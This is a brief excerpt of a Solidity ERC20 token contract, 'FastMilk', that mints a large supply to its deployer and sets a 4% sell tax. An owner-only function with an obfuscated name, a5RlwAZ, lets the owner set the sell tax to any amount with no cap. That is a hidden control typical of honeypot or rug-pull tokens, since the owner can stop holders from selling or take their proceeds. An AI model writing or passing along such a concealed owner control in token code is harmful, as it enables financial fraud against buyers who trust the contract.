...
contract FastMilk is ERC20 {
    uint256 public sellTax;
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;
    constructor() ERC20("FM", "FastMilk") {
        _mint(msg.sender, 64284862812 * (10 ** uint256(decimals())));
        sellTax = 4;
        _owner = msg.sender;
    }
    ...
    function a5RlwAZ(uint256 amount) public onlyOwner {
        sellTax = amount;
    }
